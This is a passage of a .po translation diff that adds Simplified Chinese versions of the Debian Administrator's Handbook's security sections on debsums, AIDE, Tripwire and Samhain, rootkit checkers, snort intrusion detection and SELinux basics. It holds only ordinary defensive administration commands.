the corresponding contents. Recent mathematical advances seem to weaken the absoluteness of these principles, but their use is not called into question so far, since creating different contents yielding the same fingerprint still seems to be quite a difficult task."
-msgstr ""
+msgstr "<command>debsums</command> 是一个很有趣的工具，它能找出哪些安装文件被（潜在攻击者）修改了，但是应该有所保留。首先，并非所有的 Debian 软件包都提供了该程序需要的指纹信息（可以在 <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename> 文件中找到，如果该文件存在）。<indexterm><primary>指纹</primary></indexterm> <indexterm><primary>检核和</primary></indexterm> <indexterm><primary>MD5</primary></indexterm> <indexterm><primary>SHA1</primary></indexterm> 提示：指纹是一个数值，通常是数字（甚至是十六进制），包含文件内容的签名。该签名使用某种算法（众所周知的是 MD5 或 SHA1）在某种程度上能确保文件内容微小的变化也能反映在指纹上；称为“雪崩效应”。这样就可以将数字指纹作为试金石来检测文件的内容是否被改变。这些算法是不可逆的；换句话说，它们中的大多数，知道指纹并不能得出相应的内容。近期的数学研究似乎削弱了这些原则的绝对性，但是到目前为止，还不能称之为问题，因为创建指纹相同而内容不同的文件是一个相当艰巨的任务。"
 
 #. Tag: para
 #, no-c-format
 msgid "In addition, the <filename>md5sums</filename> files are stored on the hard disk; a thorough attacker will therefore update these files so they contain the new control sums for the subverted files."
-msgstr ""
+msgstr "另外，<filename>md5sums</filename> 文件存储在硬盘上；攻击者会更新这些文件以包含被篡改文件的检核和。"
 
 #. Tag: para
 #, no-c-format
 msgid "The first drawback can be avoided by asking <command>debsums</command> to base its checks on a <filename>.deb</filename> package instead of relying on the <filename>md5sums</filename> file. But that requires downloading the matching <filename>.deb</filename> files first:"
-msgstr ""
+msgstr "第一个缺点可以通过设定 <command>debsums</command> 基于 <filename>.deb</filename> 软件包检测，而非依赖 <filename>md5sums</filename> 文件。但是，这样首先需要下载相应的 <filename>.deb</filename>："
 
 #. Tag: screen
 #, no-c-format
@@ -896,16 +905,21 @@ msgid ""
 "# </computeroutput><userinput>debsums -p /var/cache/apt/archives -g</userinput>\n"
 "      "
 msgstr ""
+"\n"
+"<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `debsums -l`</userinput>\n"
+"<computeroutput>[ ... ]\n"
+"# </computeroutput><userinput>debsums -p /var/cache/apt/archives -g</userinput>\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "It is also worth noting that, in its default configuration, <command>debsums</command> automatically generates the missing <filename>md5sums</filename> files whenever a package is installed using APT."
-msgstr ""
+msgstr "同样值得注意的是，在默认配置中，如果使用 APT 安装软件包，<command>debsums</command> 将自动产生缺失的 <filename>md5sums</filename> 文件。"
 
 #. Tag: para
 #, no-c-format
 msgid "The other problem can be avoided in a similar fashion: the check must simply be based on a pristine <filename>.deb</filename> file. Since this implies having all the <filename>.deb</filename> files for all the installed packages, and being sure of their integrity, the simplest way is to grab them from a Debian mirror. This operation can be slow and tedious, and should therefore not be considered a proactive technique to be used on a regular basis."
-msgstr ""
+msgstr "其他问题可以通过类似方法避免：检查必须基于素 <filename>.deb</filename> 文件。这意味着所有已安装的软件包都要有 <filename>.deb</filename> 文件，并确保它们的完整性，最简单的方法就是从 Debian 镜像抓取。这一过程是缓慢而冗长的，因此不应作为定期使用的主动技术。"
 
 #. Tag: screen
 #, no-c-format
@@ -916,281 +930,286 @@ msgid ""
 "# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>\n"
 "      "
 msgstr ""
+"\n"
+"<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>\n"
+"<computeroutput>[ ... ]\n"
+"# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "Note that this example uses the <command>grep-status</command> command from the <emphasis role=\"pkg\">dctrl-tools</emphasis> package, which is not installed by default."
-msgstr ""
+msgstr "注意本例使用 <emphasis role=\"pkg\">dctrl-tools</emphasis> 软件包中的 <command>grep-status</command> 命令，该命令默认情况下没有安装"
 
 #. Tag: title
 #, no-c-format
 msgid "Monitoring Files: AIDE"
-msgstr ""
+msgstr "监视文件：AIDE"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis role=\"pkg\">aide</emphasis> (Debian package)</primary>"
-msgstr ""
+msgstr "<primary><emphasis role=\"pkg\">aide</emphasis> （Debian 软件包）</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The AIDE tool (<emphasis>Advanced Intrusion Detection Environment</emphasis>) allows checking file integrity, and detecting any change against a previously recorded image of the valid system. This image is stored as a database (<filename>/var/lib/aide/aide.db</filename>) containing the relevant information on all files of the system (fingerprints, permissions, timestamps and so on). This database is first initialized with <command>aideinit</command>; it is then used daily (by the <filename>/etc/cron.daily/aide</filename> script) to check that nothing relevant changed. When changes are detected, AIDE records them in log files (<filename>/var/log/aide/*.log</filename>) and sends its findings to the administrator by email."
-msgstr ""
+msgstr "AIDE（<emphasis>Advanced Intrusion Detection Environment</emphasis> ）工具可以检查文件完整性，侦测系统之前文件镜像的任何变化。这种影响以数据库（<filename>/var/lib/aide/aide.db</filename>）形式储存，包含了系统上所有文件的相关信息（指纹，权限，时间戳，等等）。该数据库使用 <command>aideinit</command>命令初始化；然后每天（通过 <filename>/etc/cron.daily/aide</filename> 脚本）检查有无任何相关改变。如果探测到变化，AIDE 会将其记入文件（<filename>/var/log/aide/*.log</filename>）并将发现通过邮件发送给管理员。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>IN PRACTICE</emphasis> Protecting the database"
-msgstr ""
+msgstr "<emphasis>实践</emphasis> 保护数据库"
 
 #. Tag: para
 #, no-c-format
 msgid "Since AIDE uses a local database to compare the states of the files, the validity of its results is directly linked to the validity of the database. If an attacker gets root permissions on a compromised system, they will be able to replace the database and cover their tracks. A possible workaround would be to store the reference data on read-only storage media."
-msgstr ""
+msgstr "由于 AIDE 使用本地数据库来比较文件的状态，因此结果的有效性和数据库的有效性直接相关。如果攻击者获得超级用户权限，他就能替换数据库并覆盖其痕迹。一个可能的替代方案就是将参考数据储存在只读媒介上。"
 
 #. Tag: para
 #, no-c-format
 msgid "Many options in <filename>/etc/default/aide</filename> can be used to tweak the behavior of the <emphasis role=\"pkg\">aide</emphasis> package. The AIDE configuration proper is stored in <filename>/etc/aide/aide.conf</filename> and <filename>/etc/aide/aide.conf.d/</filename> (actually, these files are only used by <command>update-aide.conf</command> to generate <filename>/var/lib/aide/aide.conf.autogenerated</filename>). Configuration indicates which properties of which files need to be checked. For instance, the contents of log files changes routinely, and such changes can be ignored as long as the permissions of these files stay the same, but both contents and permissions of executable programs must be constant. Although not very complex, the configuration syntax is not fully intuitive, and reading the <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> manual page is therefore recommended."
-msgstr ""
+msgstr "<filename>/etc/default/aide</filename> 中的很多选项可以用于调整 <emphasis role=\"pkg\">aide</emphasis> 软件包行为。AIDE 配置存储在 <filename>/etc/aide/aide.conf</filename> 和 <filename>/etc/aide/aide.conf.d/</filename>（实际上，这些文件只用于 <command>update-aide.conf</command> 生成 <filename>/var/lib/aide/aide.conf.autogenerated</filename>）。配置指明哪些文件的哪些特性需要检查。譬如，日志文件的内容会有常规更新，只要这些文件的读写权限保持不变，那么就可以忽略这些变化。但是，可执行程序的内容和权限必须是不变的。虽然不是很复杂，但是配置的语法不是很直观，推荐阅读 <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> 手册。"
 
 #. Tag: para
 #, no-c-format
 msgid "A new version of the database is generated daily in <filename>/var/lib/aide/aide.db.new</filename>; if all recorded changes were legitimate, it can be used to replace the reference database."
-msgstr ""
+msgstr "新版本的数据库每天生成在 <filename>/var/lib/aide/aide.db.new</filename>；如果所有记录的变化都是合法的，就可以用它替代参考数据库。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>ALTERNATIVE</emphasis> Tripwire and Samhain"
-msgstr ""
+msgstr "<emphasis>选择</emphasis> Tripwire 和 Samhain"
 
 #. Tag: para
 #, no-c-format
 msgid "Tripwire is very similar to AIDE; even the configuration file syntax is almost the same. The main addition provided by <emphasis role=\"pkg\">tripwire</emphasis> is a mechanism to sign the configuration file, so that an attacker cannot make it point at a different version of the reference database."
-msgstr ""
+msgstr "Tripwire 和 AIDE 非常相似；甚至是配置文件的语法都几乎相同。<emphasis role=\"pkg\">tripwire</emphasis> 所提供的额外特性是签名配置文件机制，这样攻击者就不能将其指向不同版本的参考数据库。"
 
 #. Tag: para
 #, no-c-format
 msgid "Samhain also offers similar features, as well as some functions to help detecting rootkits (see the QUICK LOOK sidebar). It can also be deployed globally on a network, and record its traces on a central server (with a signature)."
-msgstr ""
+msgstr "Samhain 也提供了类似特性，还有一些能探测恶意软件的功能（参考侧边栏）。它也能在网络上全局部署，并（使用签名）记录中心服务器上的痕迹。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>QUICK LOOK</emphasis> The <emphasis role=\"pkg\">checksecurity</emphasis> and <emphasis role=\"pkg\">chkrootkit</emphasis>/<emphasis role=\"pkg\">rkhunter</emphasis> packages"
-msgstr ""
+msgstr "<emphasis>速览</emphasis> <emphasis role=\"pkg\">checksecurity</emphasis> 和 <emphasis role=\"pkg\">chkrootkit</emphasis>/<emphasis role=\"pkg\">rkhunter</emphasis> 软件包"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis role=\"pkg\">checksecurity</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis role=\"pkg\">checksecurity</emphasis></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The first of these packages contains several small scripts performing basic checks on the system (empty passwords, new setuid files, and so on) and warning the administrator if required. Despite its explicit name, an administrator should not rely solely on it to make sure a Linux system is secure."
-msgstr ""
+msgstr "三个软件包中，第一个包含了几个小脚本进行系统上的基础检查（空白口令，新的设置身份文件，等等）并警告管理员。尽管其名为“安全检查”，但是管理员不应该仅仅指望它来确保 Linux 系统安全。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">chkrootkit</emphasis> and <emphasis role=\"pkg\">rkhunter</emphasis> packages allow looking for <emphasis>rootkits</emphasis> potentially installed on the system. As a reminder, these are pieces of software designed to hide the compromise of a system while discreetly keeping control of the machine. The tests are not 100% reliable, but they can usually draw the administrator's attention to potential problems."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">chkrootkit</emphasis> 和 <emphasis role=\"pkg\">rkhunter</emphasis> 软件包可以搜索系统上安装的潜在 <emphasis>恶意软件（rootkits）</emphasis>。提示，此类软件被设计成掩盖系统已经被攻破，并谨慎的控制机器。检测并不能保证100%可靠，但是他们可以将管理员的注意力吸引到潜在问题上。"
 
 #. Tag: title
 #, no-c-format
 msgid "Detecting Intrusion (IDS/NIDS)"
-msgstr ""
+msgstr "侦测入侵（IDS/NIDS）"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>detection, intrusion</primary>"
-msgstr ""
+msgstr "<primary>侦测，入侵</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>intrusion detection</primary>"
-msgstr ""
+msgstr "<primary>入侵侦测</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>IDS</primary>"
-msgstr ""
+msgstr "<primary>IDS</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>intrusion detection system</primary>"
-msgstr ""
+msgstr "<primary>入侵探测系统</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>NIDS</primary>"
-msgstr ""
+msgstr "<primary>NIDS</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>Network</primary><secondary>IDS</secondary>"
-msgstr ""
+msgstr "<primary>网络</primary><secondary>IDS</secondary>"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>BACK TO BASICS</emphasis> Denial of service"
-msgstr ""
+msgstr "<emphasis>回到基础</emphasis> 拒绝服务"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>denial of service</primary>"
-msgstr ""
+msgstr "<primary>拒绝服务</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "A “denial of service” attack has only one goal: to make a service unavailable. Whether such an attack involves overloading the server with queries or exploiting a bug, the end result is the same: the service is no longer operational. Regular users are unhappy, and the entity hosting the targeted network service suffers a loss in reputation (and possibly in revenue, for instance if the service was an e-commerce site)."
-msgstr ""
+msgstr "“拒绝服务”攻击只有一个目的：让服务不可用。不管是通过查询使服务器过载还是利用缺陷，最终目的都是一样的：服务不再运行。正常用户就会不悦，提供网络服务的实体声誉遭受损失（可能是营收，譬如，使用服务的是一个电子商务网站）。"
 
 #. Tag: para
 #, no-c-format
 msgid "Such an attack is sometimes “distributed”; this usually involves overloading the server with large numbers of queries coming from many different sources so that the server becomes unable to answer the legitimate queries. These types of attacks have gained well-known acronyms: <acronym>DoS</acronym> and <acronym>DDoS</acronym> (depending on whether the denial of service attack is distributed or not)."
-msgstr ""
+msgstr "这种攻击有时候是“分布式的”；通常是通过来自许多不同源头的巨量查询使服务器过载，从而不能对合法查询做出应答。此类攻击有众所周知的缩写： <acronym>DoS</acronym> 和 <acronym>DDoS</acronym>（取决于拒绝服务攻击是否是分布式的）。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>snort</command> (in the Debian package of the same name) is a NIDS — a <emphasis>Network Intrusion Detection System</emphasis>. Its function is to listen to the network and try to detect infiltration attempts and/or hostile acts (including denial of service attacks). All these events are logged, and a daily email is sent to the administrator with a summary of the past 24 hours."
-msgstr ""
+msgstr "<command>snort</command>（在 Debian 的同名软件包中）属于 NIDS －<emphasis>网络入侵侦测系统（Network Intrusion Detection System）</emphasis>。它的功能是监听网络并侦测渗透尝试和敌意行为（包括拒绝服务攻击）。所有这些事件都会被记录，并且每天会给管理员发送过去２４小时的摘要。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>snort</command></primary>"
-msgstr ""
+msgstr "<primary><command>snort</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Its configuration requires describing the range of addresses that the local network covers. In practice, this means the set of all potential attack targets. Other important parameters can be configured with <command>dpkg-reconfigure snort</command>, including the network interface to monitor. This will often be <literal>eth0</literal> for an Ethernet connection, but other possibilities exist such as <literal>ppp0</literal> for an ADSL or PSTN (<emphasis>Public Switched Telephone Network</emphasis>, or good old dialup modem), or even <literal>wlan0</literal> for some wireless network cards."
-msgstr ""
+msgstr "其配置需要指明本地网络所覆盖的网络地址。实际上，这意味着所有潜在的攻击目标。其他重要参数可以使用 <command>dpkg-reconfigure snort</command> 配置，包括要监视的网络接口。对以太网连接来说，通常是 <literal>eth0</literal>，但是也可能是其他的，例如：对于 ADSL 或 PSTN（<emphasis>Public Switched Telephone Network</emphasis>，或者旧式拨号调制解调器） 是 <literal>ppp0</literal>，对于某些无线网卡是 <literal>wlan0</literal>。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> Integration with <command>prelude</command>"
-msgstr ""
+msgstr "<emphasis>进阶</emphasis> 与 <command>prelude</command> 集成"
 
 #. Tag: para
 #, no-c-format
 msgid "Prelude brings centralized monitoring of security information. Its modular architecture includes a server (the <emphasis>manager</emphasis> in <emphasis role=\"pkg\">prelude-manager</emphasis>) which gathers alerts generated by <emphasis>sensors</emphasis> of various types."
-msgstr ""
+msgstr "Prelude 将各种安全信息集中化。它的模块结构包含了服务器（<emphasis role=\"pkg\">prelude-manager</emphasis> 中的<emphasis>管理器</emphasis>）收集由各种类型的 <emphasis>传感器（sensors）</emphasis> 产生的警报信息。"
 
 #. Tag: para
 #, no-c-format
 msgid "Snort can be configured as such a sensor. Other possibilities include <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) which monitors log files (in a manner similar to <command>logcheck</command>, described in <xref linkend=\"section.logcheck\" />)."
-msgstr ""
+msgstr "Snort 可以配置成此类传感器。其他的工具包括 <emphasis>prelude-lml</emphasis>（<emphasis>Log Monitor Lackey</emphasis>），它监视日志文件（以类似 <command>logcheck</command> 的方式，其细节在 <xref linkend=\"section.logcheck\" /> 中）。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>prelude</command></primary>"
-msgstr ""
+msgstr "<primary><command>prelude</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>snort</command> configuration file (<filename>/etc/snort/snort.conf</filename>) is very long, and the abundant comments describe each directive with much detail. Getting the most out of it requires reading it in full and adapting it to the local situation. For instance, indicating which machine hosts which service can limit the number of incidents <command>snort</command> will report, since a denial of service attack on a desktop machine is far from being as critical as one on a DNS server. Another interesting directive allows storing the mappings between IP addresses and MAC addresses (these uniquely identify a network card), so as to allow detecting <emphasis>ARP spoofing</emphasis> attacks by which a compromised machine attempts to masquerade as another such as a sensitive server."
-msgstr ""
+msgstr "<command>snort</command> 配置文件（<filename>/etc/snort/snort.conf</filename>）很长，大量的注释从细节上描述每个指令。了解其大部分内容需要通读并结合具体情况。譬如，指明哪个机器上有哪种服务可以限制 <command>snort</command> 报告的数量，因为在桌面系统上的拒绝服务攻击远不及在 DNS 服务器上的严重。另一个有趣的指令是存储 IP 地址和 MAC 地址（它可以唯一的识别网卡）之间的映射关系，以便于侦测 <emphasis>ARP 欺骗</emphasis> 攻击，其中被操纵的机器试图伪装成另一个机器（例如一个关键服务器）。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>CAUTION</emphasis> Range of action"
-msgstr ""
+msgstr "<emphasis>注意</emphasis> 行动范围"
 
 #. Tag: para
 #, no-c-format
 msgid "The effectiveness of <command>snort</command> is limited by the traffic seen on the monitored network interface. It will obviously not be able to detect anything if it cannot observe the real traffic. When plugged into a network switch, it will therefore only monitor attacks targeting the machine it runs on, which is probably not the intention. The machine hosting <command>snort</command> should therefore be plugged into the “mirror” port of the switch, which is usually dedicated to chaining switches and therefore gets all the traffic."
-msgstr ""
+msgstr "<command>snort</command> 的有效性受到所监视网络界面能看到通信量的限制。如果他不能观察到实时的通信量，显然它就不能侦测到任何东西。当插入到网络交换器，它就只能监控以它正在运行的机器为目标的攻击，这很可能不是预期。因此，运行 <command>snort</command> 的机器应当插入交换机的“镜像”端口，该端口通常用于链接交换机并可以得到所有的通信数据。"
 
 #. Tag: para
 #, no-c-format
 msgid "On a small network based around a network hub, there is no such problem, since all machines get all the traffic."
-msgstr ""
+msgstr "在基于集线器为基础的小型网络上，不存在此类问题，因为所有的机器都能获取全部通信数据。"
 
 #. Tag: title
 #, no-c-format
 msgid "Introduction to SELinux"
-msgstr ""
+msgstr "SELinux 简介"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>SELinux</primary>"
-msgstr ""
+msgstr "<primary>SELinux</primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "Principles"
-msgstr ""
+msgstr "原理"
 
 #. Tag: para
 #, no-c-format
 msgid "SELinux (<emphasis>Security Enhanced Linux</emphasis>) is a <emphasis>Mandatory Access Control</emphasis> system built on Linux's LSM (<emphasis>Linux Security Modules</emphasis>) interface. In practice, the kernel queries SELinux before each system call to know whether the process is authorized to do the given operation."
-msgstr ""
+msgstr "SELinux （<emphasis>安全增强－Security Enhanced Linux</emphasis>）是一种基于Linux LSM（<emphasis>Linux 安全模块</emphasis>）的<emphasis>强制访问控制</emphasis>系统。实际上，内核在执行系统调用前会询问 SELinux 进程是否获得了执行操作的授权。"
 
 #. Tag: para
 #, no-c-format
 msgid "SELinux uses a set of rules — collectively known as a <emphasis>policy</emphasis> — to authorize or forbid operations. Those rules are difficult to create. Fortunately, two standard policies (<emphasis>targeted</emphasis> and <emphasis>strict</emphasis>) are provided to avoid the bulk of the configuration work."
-msgstr ""
+msgstr "SELinux 使用一套规则－合称为<emphasis>策略</emphasis>－来授权或禁止操作。这些规则较难创建。幸好，有两种标准策略（<emphasis>针对－targeted</emphasis> 和 <emphasis>严格－strict</emphasis>）可以避免大量的配置工作。"
 
 #. Tag: para
 #, no-c-format
 msgid "With SELinux, the management of rights is completely different from traditional Unix systems. The rights of a process depend on its <emphasis>security context</emphasis>. The context is defined by the <emphasis>identity</emphasis> of the user who started the process, the <emphasis>role</emphasis> and the <emphasis>domain</emphasis> that the user carried at that time. The rights really depend on the domain, but the transitions between domains are controlled by the roles. Finally, the possible transitions between roles depend on the identity."
-msgstr ""
+msgstr "在 SELinux 中，权限的管理完全不同于传统的 Unix 系统。进程的权限取决于它的<emphasis>安全上下文</emphasis>。上下文由唤起该进程的用户<emphasis>身份</emphasis>定义，即该时刻用户具有的<emphasis>角色</emphasis>和<emphasis>域</emphasis>。权限实际上取决于域，但是在域之间转换由角色控制。角色之间的转换取决于身份。"
 
 #. Tag: title
 #, no-c-format
 msgid "Security contexts and Unix users"
-msgstr ""
+msgstr "安全上下文和 Unix 用户"
 
 #. Tag: para
 #, no-c-format
 msgid "In practice, during login, the user gets assigned a default security context (depending on the roles that they should be able to endorse). This defines the current domain, and thus the domain that all new child processes will carry. If you want to change the current role and its associated domain, you must call <command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command> (there's usually only a single domain allowed for a given role, the <literal>-t</literal> parameter can thus often be left out). This command authenticates you by asking you to type your password. This feature forbids programs to automatically switch roles. Such changes can only happen if they are explicitly allowed in the SELinux policy."
-msgstr ""
+msgstr "实际上，在登录期间，用户被赋予默认的安全上下文（取决于它们的角色）。这定义了当前域，以及所有新的子进程的域。如果想要改变当前角色和相关联的域，就必须调用 <command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command>（一个指定角色通常只能被赋予一个域，<literal>-t</literal> 参数可以忽略）。该命令需要口令授权。这个特性可以禁止程序自动切换角色。在 SELinux 策略中，这种改变只能是显式的。"
 
 #. Tag: para
 #, no-c-format
 msgid "Obviously the rights do not apply to all <emphasis>objects</emphasis> (files, directories, sockets, devices, etc.). They can vary from object to object. To achieve this, each object is associated to a <emphasis>type</emphasis> (this is known as labeling). Domain's rights are thus expressed with sets of (dis)allowed operations on those types (and, indirectly, on all objects which are labeled with the given type)."
-msgstr ""
+msgstr "显然，权限并不能适用于所有的<emphasis>对象</emphasis>（文件，目录，套接字，设备，等等）。它们可能随对象而变化。为了实现这一目标，每种对象都和一种<emphasis>类型</emphasis>相关联（称为标记）。域权限进而通过对各种类型（间接地对标识为各种类型的对象）允许或不允许操作的集合表示。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>EXTRA</emphasis> Domains and types are equivalent"
-msgstr ""
+msgstr "<emphasis>补充</emphasis>域和类型等效"
 
 #. Tag: para
 #, no-c-format
 msgid "Internally, a domain is just a type, but a type that only applies to processes. That's why domains are suffixed with <literal>_t</literal> just like object's types."
-msgstr ""
+msgstr "在内部，域只是类型，但是类型只适用于进程。这就是为什么域后缀如同对象类型使用<literal>_t</literal>。"
 
 #. Tag: para
 #, no-c-format
 msgid "By default, a program inherits its domain from the user who started it, but the standard SELinux policies expect many important programs to run in dedicated domains. To achieve this, those executables are labeled with a dedicated type (for example <command>ssh</command> is labeled with <literal>ssh_exec_t</literal>, and when the program starts, it automatically switches in the <literal>ssh_t</literal> domain). This automatic domain transition mechanism makes it possible to grant only the rights required by each program. It is a fundamental principle of SELinux."
-msgstr ""
+msgstr "默认情况下，程序从唤起它的用户继承域，但是标准 SELinux 政策限制了许多重要的程序只能在指定的域运行。为了实现这一目的，这些可执行文件被标识为指定类型（例如<command>ssh</command> 被标识成 <literal>ssh_exec_t</literal>，当程序被唤起，它会自动切换到 <literal>ssh_t</literal> 域）。这种自动域转换机制，使得它可以仅授予每个程序所需要的权利。这是 SELinux 的基本原理。"
 
 #. Tag: title
 #, no-c-format
 msgid "Automatic transitions between domains"
-msgstr ""
+msgstr "域之间的自动转换"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>IN PRACTICE</emphasis> Finding the security context"
-msgstr ""
+msgstr "<emphasis>实践</emphasis>找到安全上下文"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>security context</primary>"
-msgstr ""
+msgstr "<primary>安全上下文</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>context, security context</primary>"
-msgstr ""
+msgstr "<primary>上下文，安全上下文</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary>"
-msgstr ""
+msgstr "<primary>MCS（<emphasis>多类别安全－Multi-Category Security</emphasis>）</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "To find the security context of a given process, you should use the <literal>Z</literal> option of <command>ps</command>."
-msgstr ""
+msgstr "要找到指定进程的安全上下文，就要在 <command>ps</command> 命令中使用 <literal>Z</literal> 选项。"
 
 #. Tag: screen
 #, no-c-format
@@ -1198,16 +1217,18 @@ msgid ""
 "<computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>\n"
 "<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>\n"
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>\n"
+"<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "The first field contains the identity, the role, the domain and the MCS level, separated by colons. The MCS level (<emphasis>Multi-Category Security</emphasis>) is a parameter that intervenes in the setup of a confidentiality protection policy, which regulates the access to files based on their sensitivity. This feature will not be explained in this book."
-msgstr ""
+msgstr "第一个区段包含了身份，角色，域和 MCS 等级，使用冒号分隔。MCS 等级（<emphasis>多类别安全－Multi-Category Security</emphasis>）是一个参数，它会影响保护策略的机密性，进而基于敏感性管制对文件的访问。本书中，此特性将不做详细解释。"
 
 #. Tag: para
 #, no-c-format
 msgid "To find the current security context in a shell, you should call <command>id -Z</command>."
-msgstr ""
+msgstr "要在命令行中显示当前的安全上下文，应当调用 <command>id -Z</command>。"
 
 #. Tag: screen
 #, no-c-format
@@ -1215,11 +1236,13 @@ msgid ""
 "<computeroutput>$ </computeroutput><userinput>id -Z</userinput>\n"
 "<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>\n"
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>id -Z</userinput>\n"
+"<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "Finally, to find the type assigned to a file, you can use <command>ls -Z</command>."
-msgstr ""
+msgstr "要显示赋予文件的类型，使用 <command>ls -Z</command>。"
 
 #. Tag: screen
 #, no-c-format
@@ -1228,101 +1251,104 @@ msgid ""
 "<computeroutput>unconfined_u:object_r:user_home_t:s0 test\n"
 "     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>\n"
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>\n"
+"<computeroutput>unconfined_u:object_r:user_home_t:s0 test\n"
+"     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "It is worth noting that the identity and role assigned to a file bear no special importance (they are never used), but for the sake of uniformity, all objects get assigned a complete security context."
-msgstr ""
+msgstr "注意要将身份和角色赋予不是特别重要的文件（从未使用过），但是为了统一，所有的对象都被赋予完整的安全上下文。"
 
 #. Tag: title
 #, no-c-format
 msgid "Setting Up SELinux"
-msgstr ""
+msgstr "设置 SELinux"
 
 #. Tag: para
 #, no-c-format
 msgid "SELinux support is built into the standard kernels provided by Debian. The core Unix tools support SELinux without any modifications. It is thus relatively easy to enable SELinux."
-msgstr ""
+msgstr "SELinux 支持嵌入到 Debian 提供的标准内核中。Unix 核心工具无需修改就支持 SELinux。因此，启用 SELinux 也相对容易"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>aptitude install selinux-basics selinux-policy-default</command> command will automatically install the packages required to configure an SELinux system."
-msgstr ""
+msgstr "<command>aptitude install selinux-basics selinux-policy-default</command> 命令会自动安装配置 SELinux 系统所需要的软件包。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">selinux-policy-default</emphasis> package contains a set of standard rules. By default, this policy only restricts access for a few broadly exposed services. The user sessions are not restricted and it is thus unlikely that SELinux would block legitimate user operations. However, this does enhance the security of system services running on the machine. To setup a policy equivalent to the old “strict” rules, you just have to disable the <literal>unconfined</literal> module (modules management is detailed further in this section)."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">selinux-policy-default</emphasis> 软件包含有一套标准规则。默认情况，这些策略只是限制了几个广泛暴露的服务。用户会话没有被限制，也不会阻止合法用户的操作。然而，它也确实增强了运行机器的系统服务安全。要设置和之前的“严格”规则等效的策略，只需禁用 <literal>unconfined</literal> 模块（模块管理将在后面详细讨论）。"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the policy has been installed, you should label all the available files (which means assigning them a type). This operation must be manually started with <command>fixfiles relabel</command>."
-msgstr ""
+msgstr "一旦策略安装，就要标识全部有效文件（即给它们赋予类型）。该操作必须使用 <command>fixfiles relabel</command> 命令手工启动。"
 
 #. Tag: para
 #, no-c-format
